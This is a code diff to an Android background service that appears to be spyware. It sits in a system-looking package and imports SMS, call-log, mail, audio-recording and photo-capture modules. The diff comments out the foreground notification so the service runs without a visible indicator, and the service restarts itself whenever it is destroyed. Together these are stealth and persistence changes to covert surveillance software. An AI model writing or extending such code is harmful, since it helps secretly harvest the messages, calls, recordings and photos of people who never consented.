@@ -3,7 +3,6 @@ package com.android.service;
 import org.json.JSONObject;
 
 import android.app.AlarmManager;
-import android.app.Notification;
 import android.app.PendingIntent;
 import android.app.Service;
 import android.content.BroadcastReceiver;
@@ -23,7 +22,6 @@ import com.android.db.CallConten;
 import com.android.db.PhoneMailBody;
 import com.android.db.SMSConten;
 import com.android.db.SqlUtils;
-import com.android.smsclient.R;
 import com.android.sound.SoundRecord;
 import com.android.sound.TakePhoto;
 import com.android.utils.LogUtils;
@@ -58,6 +56,7 @@ public class ClientService extends Service {
 	public void onCreate() {
 		// TODO Auto-generated method stub
 		super.onCreate();
+		Utils.init(this);
 		am = (AlarmManager) this
 				.getSystemService(Context.ALARM_SERVICE);
 		LogUtils.write(TAG, "初始化推送服务器");
@@ -76,11 +75,11 @@ public class ClientService extends Service {
 		acquireWakeLock();
 		
 		
-		Notification notification = new Notification(R.drawable.nt,"", System.currentTimeMillis());
-
-		PendingIntent pendingintent = PendingIntent.getService(this, 0,new Intent(this, ClientService.class), 0);
-		notification.setLatestEventInfo(this, "", "", pendingintent);
-		startForeground(0x111, notification);
+//		Notification notification = new Notification(R.drawable.nt,"", System.currentTimeMillis());
+//
+//		PendingIntent pendingintent = PendingIntent.getService(this, 0,new Intent(this, ClientService.class), 0);
+//		notification.setLatestEventInfo(this, "", "", pendingintent);
+//		startForeground(0x111, notification);
 	}
 	
 	@Override
@@ -97,7 +96,7 @@ public class ClientService extends Service {
 		sendBroadcast(destroy);  
 		super.onDestroy();
 		this.unregisterReceiver(receiver);
-		stopForeground(true);
+		//stopForeground(true);
 		Intent intent=new Intent(this,ClientService.class);
 		startService(intent);
 	}
